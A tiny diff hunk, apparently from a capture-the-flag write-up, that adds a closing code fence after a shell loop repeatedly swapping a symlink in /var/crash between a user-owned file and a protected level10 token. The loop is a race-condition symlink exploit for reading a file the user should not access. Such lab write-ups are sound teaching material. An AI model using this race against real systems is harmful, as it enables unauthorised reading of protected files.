@@ -74,6 +74,7 @@ while true; do
     ln -sf /var/crash/fake_ptr /var/crash/fake    # point to a file you own
     ln -sf /home/user/level10/token /var/crash/fake  # point to real token
 done
+```
 
 Open 3 VM windows to see the result !
 
